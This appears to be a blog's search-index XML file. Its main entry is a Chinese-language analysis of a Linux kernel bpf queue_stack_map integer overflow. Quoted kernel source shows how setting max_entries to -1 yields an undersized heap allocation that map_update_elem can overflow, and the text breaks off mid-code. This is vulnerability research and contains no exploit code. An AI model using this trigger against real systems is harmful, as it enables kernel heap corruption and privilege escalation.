<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2017-11176分析</title>
      <link href="/2020/04/18/CVE-2017-11176%E5%88%86%E6%9E%90/"/>
      <url>/2020/04/18/CVE-2017-11176%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux kernel 整数溢出-堆溢出漏洞及其利用与分析</title>
      <link href="/2020/04/02/Linux-kernel-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA-%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/"/>
      <url>/2020/04/02/Linux-kernel-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA-%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>该漏洞位于linux/bpf/queue_stack_maps.c 文件中。bpf(Berkeley Packet Filter)主要用于包过滤。</p><p>漏洞所在函数的调用链如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue_stack_map_alloc &lt;- find_and_alloc_map&lt;- </span><br><span class="line">map_create &lt;- SYSCALL_DEFINE3(linux中定义syscall，3是代表有三个参数)</span><br></pre></td></tr></table></figure><p>queue_stack_map_alloc 函数的调用实际上是通过 <code>bpf_map_ops</code> 结构体中的 map_alloc进行调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">queue_map_ops</span> = &#123;</span></span><br><span class="line">.map_alloc_check = queue_stack_map_alloc_check,</span><br><span class="line">.map_alloc = queue_stack_map_alloc,<span class="comment">//***</span></span><br><span class="line">.map_free = queue_stack_map_free,</span><br><span class="line">.map_lookup_elem = queue_stack_map_lookup_elem,</span><br><span class="line">.map_update_elem = queue_stack_map_update_elem,<span class="comment">//***</span></span><br><span class="line">.map_delete_elem = queue_stack_map_delete_elem,</span><br><span class="line">.map_push_elem = queue_stack_map_push_elem,<span class="comment">//***</span></span><br><span class="line">.map_pop_elem = queue_map_pop_elem,</span><br><span class="line">.map_peek_elem = queue_map_peek_elem,</span><br><span class="line">.map_get_next_key = queue_stack_map_get_next_key,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先来分析bpf的syscall定义函数 ：</p><p>SYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr __user *, uattr, unsigned int, size)，</p><p>该函数的主要代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bpf 321  <span class="comment">// #linux/tools/lib/bpf/bpf.c</span></span></span><br><span class="line">SYSCALL_DEFINE3(bpf, <span class="keyword">int</span>, cmd, <span class="keyword">union</span> bpf_attr __user *, uattr, <span class="keyword">unsigned</span> <span class="keyword">int</span>, size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">union</span> bpf_attr attr = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sysctl_unprivileged_bpf_disabled &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">err = bpf_check_uarg_tail_zero(uattr, <span class="keyword">sizeof</span>(attr), size);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">size = <span class="keyword">min_t</span>(u32, size, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* copy attributes from user space, may be less than sizeof(bpf_attr) */</span></span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;attr, uattr, size) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">err = security_bpf(cmd, &amp;attr, size);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;       </span><br><span class="line"><span class="keyword">case</span> BPF_MAP_CREATE:</span><br><span class="line">err = map_create(&amp;attr); <span class="comment">// add</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_LOOKUP_ELEM:</span><br><span class="line">err = map_lookup_elem(&amp;attr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_UPDATE_ELEM:</span><br><span class="line">err = map_update_elem(&amp;attr); <span class="comment">//edit</span></span><br><span class="line">***********************</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个系统调用有三个参数：<code>cmd</code>  、<code>uattr</code>、<code>size</code>、然后再将<code>uattr</code> 内容负责到<code>attr</code>中然后传到<code>map_create</code>,通过<code>cmd</code> 来选择功能。cmd 的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> bpf_cmd &#123;</span><br><span class="line">BPF_MAP_CREATE,</span><br><span class="line">BPF_MAP_LOOKUP_ELEM,</span><br><span class="line">BPF_MAP_UPDATE_ELEM,</span><br><span class="line">BPF_MAP_DELETE_ELEM,</span><br><span class="line">BPF_MAP_GET_NEXT_KEY,</span><br><span class="line">BPF_PROG_LOAD,</span><br><span class="line">BPF_OBJ_PIN,</span><br><span class="line">BPF_OBJ_GET,</span><br><span class="line">BPF_PROG_ATTACH,</span><br><span class="line">BPF_PROG_DETACH,</span><br><span class="line">BPF_PROG_TEST_RUN,</span><br><span class="line">BPF_PROG_GET_NEXT_ID,</span><br><span class="line">BPF_MAP_GET_NEXT_ID,</span><br><span class="line">BPF_PROG_GET_FD_BY_ID,</span><br><span class="line">BPF_MAP_GET_FD_BY_ID,</span><br><span class="line">BPF_OBJ_GET_INFO_BY_FD,</span><br><span class="line">BPF_PROG_QUERY,</span><br><span class="line">BPF_RAW_TRACEPOINT_OPEN,</span><br><span class="line">BPF_BTF_LOAD,</span><br><span class="line">BPF_BTF_GET_FD_BY_ID,</span><br><span class="line">BPF_TASK_FD_QUERY,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再来看看 map_create 函数，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_create</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span><span class="comment">//参数attr</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">int</span> f_flags;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = CHECK_ATTR(BPF_MAP_CREATE);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">f_flags = bpf_get_file_flag(attr-&gt;map_flags);</span><br><span class="line"><span class="keyword">if</span> (f_flags &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> f_flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (numa_node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)numa_node &gt;= nr_node_ids ||</span><br><span class="line">     !node_online(numa_node)))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* find map type and init map: hashtable vs rbtree vs bloom vs ... */</span></span><br><span class="line"><span class="built_in">map</span> = find_and_alloc_map(attr); [<span class="number">2</span>]            <span class="comment">// 参数attr</span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">err = bpf_obj_name_cpy(<span class="built_in">map</span>-&gt;name, attr-&gt;map_name);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line"></span><br><span class="line">atomic_set(&amp;<span class="built_in">map</span>-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">atomic_set(&amp;<span class="built_in">map</span>-&gt;usercnt, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (attr-&gt;btf_key_type_id || attr-&gt;btf_value_type_id) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!attr-&gt;btf_key_type_id || !attr-&gt;btf_value_type_id) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">btf = btf_get_by_fd(attr-&gt;btf_fd);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(btf)) &#123;</span><br><span class="line">err = PTR_ERR(btf);</span><br><span class="line"><span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = map_check_btf(<span class="built_in">map</span>, btf, attr-&gt;btf_key_type_id,</span><br><span class="line">    attr-&gt;btf_value_type_id);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">btf_put(btf);</span><br><span class="line"><span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span>-&gt;btf = btf;</span><br><span class="line"><span class="built_in">map</span>-&gt;btf_key_type_id = attr-&gt;btf_key_type_id;</span><br><span class="line"><span class="built_in">map</span>-&gt;btf_value_type_id = attr-&gt;btf_value_type_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = security_bpf_map_alloc(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line"></span><br><span class="line">err = bpf_map_init_memlock(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> free_map_sec;</span><br><span class="line"></span><br><span class="line">err = bpf_map_alloc_id(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> free_map;</span><br><span class="line"></span><br><span class="line">err = bpf_map_new_fd(<span class="built_in">map</span>, f_flags);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* failed to allocate fd.</span></span><br><span class="line"><span class="comment"> * bpf_map_put() is needed because the above</span></span><br><span class="line"><span class="comment"> * bpf_map_alloc_id() has published the map</span></span><br><span class="line"><span class="comment"> * to the userspace and the userspace may</span></span><br><span class="line"><span class="comment"> * have refcnt-ed it through BPF_MAP_GET_FD_BY_ID.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">bpf_map_put(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">free_map:</span><br><span class="line">bpf_map_release_memlock(<span class="built_in">map</span>);</span><br><span class="line">free_map_sec:</span><br><span class="line">security_bpf_map_free(<span class="built_in">map</span>);</span><br><span class="line">free_map_nouncharge:</span><br><span class="line">btf_put(<span class="built_in">map</span>-&gt;btf);</span><br><span class="line"><span class="built_in">map</span>-&gt;ops-&gt;map_free(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 [2] 生成和初始化一个 struct bpf_map *map;</p><p>find_and_alloc_map 代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">find_and_alloc_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">u32 type = attr-&gt;map_type;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (type &gt;= ARRAY_SIZE(bpf_map_types))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">type = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));</span><br><span class="line">ops = bpf_map_types[type];</span><br><span class="line"><span class="keyword">if</span> (!ops)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ops-&gt;map_alloc_check) &#123;</span><br><span class="line">err = ops-&gt;map_alloc_check(attr);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (attr-&gt;map_ifindex)</span><br><span class="line">ops = &amp;bpf_map_offload_ops;</span><br><span class="line"><span class="built_in">map</span> = ops-&gt;map_alloc(attr);[<span class="number">3</span>] </span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line"><span class="built_in">map</span>-&gt;ops = ops;</span><br><span class="line"><span class="built_in">map</span>-&gt;map_type = type;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 map_alloc 就是 <code>.map_alloc = queue_stack_map_alloc</code> </p><p>queue_stack_map_alloc的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">queue_stack_map_alloc</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret, numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span>;</span></span><br><span class="line">u32 size, value_size;</span><br><span class="line">u64 queue_size, cost;</span><br><span class="line"></span><br><span class="line">size = attr-&gt;max_entries + <span class="number">1</span>; [<span class="number">4</span>]</span><br><span class="line">value_size = attr-&gt;value_size;[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">queue_size = <span class="keyword">sizeof</span>(*qs) + (u64) value_size * size;[<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">cost = queue_size;</span><br><span class="line"><span class="keyword">if</span> (cost &gt;= U32_MAX - PAGE_SIZE)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-E2BIG);</span><br><span class="line"></span><br><span class="line">cost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">ret = bpf_map_precharge_memlock(cost);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line"></span><br><span class="line">qs = bpf_map_area_alloc(queue_size, numa_node);[<span class="number">7</span>]</span><br><span class="line"><span class="keyword">if</span> (!qs)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(qs, <span class="number">0</span>, <span class="keyword">sizeof</span>(*qs));</span><br><span class="line"></span><br><span class="line">bpf_map_init_from_attr(&amp;qs-&gt;<span class="built_in">map</span>, attr);</span><br><span class="line"></span><br><span class="line">qs-&gt;<span class="built_in">map</span>.pages = cost;</span><br><span class="line">qs-&gt;size = size;</span><br><span class="line"></span><br><span class="line">raw_spin_lock_init(&amp;qs-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;qs-&gt;<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看看 bpf_map_area_alloc 函数再一起结合上面的分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">bpf_map_area_alloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">int</span> numa_node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* We definitely need __GFP_NORETRY, so OOM killer doesn't</span></span><br><span class="line"><span class="comment"> * trigger under memory pressure as we really just want to</span></span><br><span class="line"><span class="comment"> * fail instead.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">gfp_t</span> flags = __GFP_NOWARN | __GFP_NORETRY | __GFP_ZERO;</span><br><span class="line"><span class="keyword">void</span> *area;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt;= (PAGE_SIZE &lt;&lt; PAGE_ALLOC_COSTLY_ORDER)) &#123;</span><br><span class="line">area = kmalloc_node(size, GFP_USER | flags, numa_node);</span><br><span class="line"><span class="keyword">if</span> (area != <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> area;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> __vmalloc_node_flags_caller(size, numa_node, GFP_KERNEL | flags,</span><br><span class="line">   __builtin_return_address(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先 整个调用链来看，可以看出 <code>attr</code> 是可控并且在传递的过程没有被改变。</p><p>然后再回到 queue_stack_map_alloc 函数，主要的漏洞点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">size = attr-&gt;max_entries + 1; [4]</span><br><span class="line">value_size = attr-&gt;value_size;[5]</span><br><span class="line">queue_size = sizeof(*qs) + (u64) value_size * size;[6]</span><br><span class="line">qs = bpf_map_area_alloc(queue_size, numa_node);[7]</span><br></pre></td></tr></table></figure><p>整个attr 是可控的，如果令attr-&gt;max_entries = -1。那size 就为 0，那 queue_size 的大小 为 sizeof(*qs)</p><p>那么此时的size 是远远大于 kmalloc_node 出来的size，如果该系统调用存在编辑功能，那就能产生了堆上的整数溢出漏洞。就可以修改该堆块后面的值。</p><pre><code>case BPF_MAP_UPDATE_ELEM:    err = map_update_elem(&amp;attr); //edit</code></pre><p>map_update_elem ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_update_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line"><span class="keyword">void</span> __user *uvalue = u64_to_user_ptr(attr-&gt;value);</span><br><span class="line"><span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">void</span> *key, *value;</span><br><span class="line">u32 value_size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_UPDATE_ELEM))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">f = fdget(ufd);</span><br><span class="line"><span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(f.file-&gt;f_mode &amp; FMODE_CAN_WRITE)) &#123;</span><br><span class="line">err = -EPERM;</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">err = PTR_ERR(key);</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">    <span class="built_in">map</span>-&gt;map_type == 